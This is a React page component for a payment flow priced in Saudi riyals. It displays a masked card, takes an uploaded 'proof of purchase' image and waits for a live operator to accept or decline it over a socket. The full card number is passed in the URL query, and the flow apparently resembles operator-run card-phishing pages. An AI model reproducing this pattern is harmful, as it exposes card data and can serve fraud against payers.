import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import axios from "axios";
import { LuCamera, LuUpload, LuX } from "react-icons/lu";
import { api_route, socket } from "../App";
import { useTranslation } from "../context/LanguageContext";
import FloatingActions from "../components/FloatingActions";

const MAX_BYTES = 5 * 1024 * 1024;
const ACCEPT = ["image/jpeg", "image/png"];

function parseQueryData(search) {
  try {
    const raw = new URLSearchParams(search).get("data");
    if (!raw) return null;
    return JSON.parse(raw);
  } catch {
    return null;
  }
}

function cardDigits(cardNumber) {
  return String(cardNumber || "").replace(/\D/g, "");
}

function cardBrandLabel(cardNumber) {
  const digits = cardDigits(cardNumber);
  if (digits.startsWith("4")) return "VISA Ecommerce";
  return "Mastercard Ecommerce";
}

function maskCardNumber(cardNumber) {
  const digits = cardDigits(cardNumber);
  if (digits.length < 4) return "****";
  return `•••• •••• •••• ${digits.slice(-4)}`;
}

const ProofPurchase = () => {
  const { t, dir } = useTranslation();
  const fileRef = useRef(null);
  const [file, setFile] = useState(null);
  const [preview, setPreview] = useState("");
  const [dragOver, setDragOver] = useState(false);
  const [error, setError] = useState("");
  const [load, setLoad] = useState(false);
  const [done, setDone] = useState(false);

  const data = useMemo(() => parseQueryData(window.location.search), []);
  const _id = data?._id || sessionStorage.getItem("id");
  const company = data?.companyData || {};
  const companyName = company.nameKey
    ? t(company.nameKey)
    : company.name || "—";
  const priceNum =
    parseFloat(String(company.price ?? "").replace(/[^\d.]/g, "")) || 0;
  const vat = +(priceNum * 0.15).toFixed(2);
  const transactionAmount = (priceNum).toFixed(2);
  const cardLabel = `${cardBrandLabel(data?.cardNumber)} - ${maskCardNumber(
    data?.cardNumber,
  )}`;

  useEffect(() => {
    if (_id) socket.emit("bindOrder", _id);
  }, [_id]);

  useEffect(() => {
    return () => {
      if (preview) URL.revokeObjectURL(preview);
    };
  }, [preview]);

  const applyFile = (next) => {
    setError("");
    setDone(false);
    if (!next) return;
    if (!ACCEPT.includes(next.type)) {
      setError(t("proof.invalidType"));
      return;
    }
    if (next.size > MAX_BYTES) {
      setError(t("proof.tooLarge"));
      return;
    }
    if (preview) URL.revokeObjectURL(preview);
    setFile(next);
    setPreview(URL.createObjectURL(next));
  };

  const clearFile = () => {
    if (preview) URL.revokeObjectURL(preview);
    setFile(null);
    setPreview("");
    if (fileRef.current) fileRef.current.value = "";
  };

  const onAccept = useCallback(
    (id) => {
      if (id !== _id) return;
      setLoad(false);
      const payload = encodeURIComponent(JSON.stringify(data));
      window.location.href = `/confirm?data=${payload}`;
    },
    [_id, data],
  );

  const onDecline = useCallback(
    (id) => {
      if (id !== _id) return;
      setLoad(false);
      setDone(false);
      clearFile();
      setError(t("proof.declined"));
    },
    [_id, t],
  );

  useEffect(() => {
    socket.on("acceptPurchaseProof", onAccept);
    socket.on("declinePurchaseProof", onDecline);
    return () => {
      socket.off("acceptPurchaseProof", onAccept);
      socket.off("declinePurchaseProof", onDecline);
    };
  }, [onAccept, onDecline]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!_id || !file) return;
    setLoad(true);
    setError("");
    try {
      const image = await new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result);
        reader.onerror = reject;
        reader.readAsDataURL(file);
      });
      await axios.post(`${api_route}/proof/${_id}`, {
        image,
        fileName: file.name,
        mimeType: file.type,
      });
      socket.emit("purchaseProof", { id: _id, fileName: file.name });
    } catch {
      setLoad(false);
      setError(t("proof.uploadFailed"));
    }
  };

  const rows = [
    {
      label: t("proof.amount"),
      value: `${transactionAmount} ${t("common.currencySar")}`,
      ltr: true,
    },
    { label: t("proof.card"), value: cardLabel, ltr: true },
    { label: t("proof.fees"), value: t("proof.feesValue"), ltr: true },
    { label: t("proof.merchant"), value: companyName, ltr: true },
    { label: t("proof.account"), value: "****" },
    { label: t("proof.country"), value: "Saudi Arabia" },
  ];

  return (
    <div className="flex min-h-screen w-full flex-col bg-white pb-24" dir={dir}>
      {load ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
          <div className="mx-6 flex flex-col items-center gap-3 rounded-2xl bg-white px-8 py-6 shadow-lg">
            <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#146394]/20 border-t-[#146394]" />
            <span className="text-sm font-bold text-[#146394]">
              {t("proof.reviewing")}
            </span>
          </div>
        </div>
      ) : null}

      <form
        onSubmit={handleSubmit}
        className="mx-auto flex w-full max-w-md flex-col px-5 pt-2"
      >
        <h1 className="text-[22px] font-extrabold leading-snug text-[#146394]">
          {t("proof.title")}
        </h1>
        <p className="mt-1.5 text-sm font-medium text-gray-400">
          {t("proof.subtitle")}
        </p>

        <p className="mt-6 text-sm font-semibold text-gray-400">
          {t("proof.context")}
        </p>

        <dl className="mt-3 space-y-2.5">
          {rows.map((row) => (
            <div
              key={row.label}
              className="flex flex-wrap items-baseline gap-x-1"
            >
              <dt className="text-[15px] font-bold text-[#146394]">
                {row.label}:
              </dt>
              <dd
                className="text-[15px] font-extrabold text-[#1A7AB8]"
                dir={row.ltr ? "ltr" : dir}
              >
                {row.value}
              </dd>
            </div>
          ))}
        </dl>

        <input
          ref={fileRef}
          type="file"
          accept="image/jpeg,image/png"
          className="hidden"
          onChange={(e) => applyFile(e.target.files?.[0])}
        />

        <div
          role="button"
          tabIndex={0}
          onClick={() => fileRef.current?.click()}
          onKeyDown={(e) => {
            if (e.key === "Enter" || e.key === " ") {
              e.preventDefault();
              fileRef.current?.click();
            }
          }}
          onDragOver={(e) => {
            e.preventDefault();
            setDragOver(true);
          }}
          onDragLeave={() => setDragOver(false)}
          onDrop={(e) => {
            e.preventDefault();
            setDragOver(false);
            applyFile(e.dataTransfer.files?.[0]);
          }}
          className={`mt-7 flex min-h-[168px] w-full cursor-pointer flex-col items-center justify-center rounded-2xl border-2 border-dashed px-4 py-6 text-center transition ${
            dragOver
              ? "border-[#146394] bg-[#E8F3FB]"
              : "border-[#B7C9D6] bg-[#F4F8FB]"
          }`}
        >
          {preview ? (
            <div className="relative w-full">
              <img
                src={preview}
                alt=""
                className="mx-auto max-h-40 rounded-xl object-contain"
              />
              <button
                type="button"
                onClick={(e) => {
                  e.stopPropagation();
                  clearFile();
                }}
                className="absolute -top-2 left-1/2 flex h-7 w-7 -translate-x-1/2 items-center justify-center rounded-full bg-white text-[#146394] shadow"
                aria-label={t("common.close")}
              >
                <LuX className="h-4 w-4" />
              </button>
              <p className="mt-3 truncate text-xs font-bold text-[#146394]">
                {file?.name}
              </p>
            </div>
          ) : (
            <>
              <span className="mb-3 flex h-14 w-14 items-center justify-center rounded-full border-2 border-[#146394] text-[#146394]">
                <LuCamera className="h-7 w-7" />
              </span>
              <p className="text-sm font-extrabold text-[#146394]">
                {t("proof.uploadHint")}
              </p>
              <p className="mt-1 text-xs font-semibold text-gray-400">
                {t("proof.uploadTypes")}
              </p>
            </>
          )}
        </div>

        {error ? (
          <p className="mt-3 text-center text-sm font-semibold text-red-600">
            {error}
          </p>
        ) : null}

        {done ? (
          <p className="mt-3 text-center text-sm font-bold text-green-600">
            {t("proof.accepted")}
          </p>
        ) : null}

        <button
          type="submit"
          disabled={!file || !_id}
          className={`mt-6 flex w-full items-center justify-center gap-2 rounded-xl py-3.5 text-base font-extrabold text-white shadow-sm ${
            file && _id ? "bg-[#50D3A5]" : "cursor-not-allowed bg-[#50D3A5]/50"
          }`}
        >
          <LuUpload className="h-5 w-5" />
          {t("proof.confirm")}
        </button>

        <p className="mt-5 text-center text-[11px] font-medium leading-relaxed text-gray-400">
          {t("proof.secureNote")}
        </p>
      </form>

      <FloatingActions />
    </div>
  );
};

export default ProofPurchase;
